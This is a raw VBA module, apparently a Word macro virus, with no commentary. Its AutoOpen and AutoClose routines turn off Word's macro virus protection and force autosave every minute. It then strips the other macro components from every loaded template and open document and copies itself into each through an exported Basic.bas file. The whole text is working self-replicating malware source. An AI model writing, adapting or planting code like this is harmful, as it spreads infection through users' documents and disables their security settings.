   Attribute VB_Name = "Module1"
   Sub AutoClose()
       Application.Options.VirusProtection = False
   End Sub
   Sub AutoOpen()
       On Error GoTo ErrorCL

       Const aLin As Long = 73

       Dim aTemp As Variant
       Dim aTName As String
       Dim aTPro As Variant
       Dim aPro As Variant
       Dim aName As String
       Dim aDoc As Variant
       Dim aCodeLin As Long
       Dim aTCodeLin As Long

       With Application.Options
           .VirusProtection = False
           .SaveInterval = 1
       End With

        'D--N
       For Each aTemp In Application.Templates
           With aTemp.VBProject
               aTName = .VBComponents(1).Name
               aTCodeLin = .VBComponents("Module1").CodeModule.CountOfLines
               If aTCodeLin <> aLin Then
                   For Each aTPro In .VBComponents
                       If aTPro.Name <> aTName Then
                           .VBComponents.Remove (aTPro)
                       End If
                   Next aTPro
                   ActiveDocument.VBProject.VBComponents("Module1").Export ("C:\Program Files\Microsoft Office\Templates\Basic.bas")
                   .VBComponents.Import ("C:\Program Files\Microsoft Office\Templates\Basic.bas")
                   aTemp.Save
                   .VBComponents(1).Name = "ThisDocuments"
               End If
           End With
       Next aTemp

        'N--D
       For Each aDoc In Application.Documents
           With aDoc.VBProject
               aName = .VBComponents(1).Name
               aCodeLin = .VBComponents("Module1").CodeModule.CountOfLines
               If aCodeLin <> aLin Then
                   For Each aPro In .VBComponents
                       If aPro.Name <> aName Then
                           .VBComponents.Remove (aPro)
                       End If
                   Next aPro
                   .VBComponents.Import ("C:\Program Files\Microsoft Office\Templates\Basic.bas")
                   Application.ActiveDocument.Save
               End If
           End With
       Next aDoc

       Exit Sub

   ErrorCL:
       Select Case Err.Number
           Case 53   'There is Not Basic.bas
               Application.NormalTemplate.VBProject.VBComponents("Module1").Export ("C:\Program Files\Microsoft Office\Templates\Basic.bas")
               Resume
           Case -2147352565
               aCodeLin = 0
               Resume Next
       End Select
   End Sub
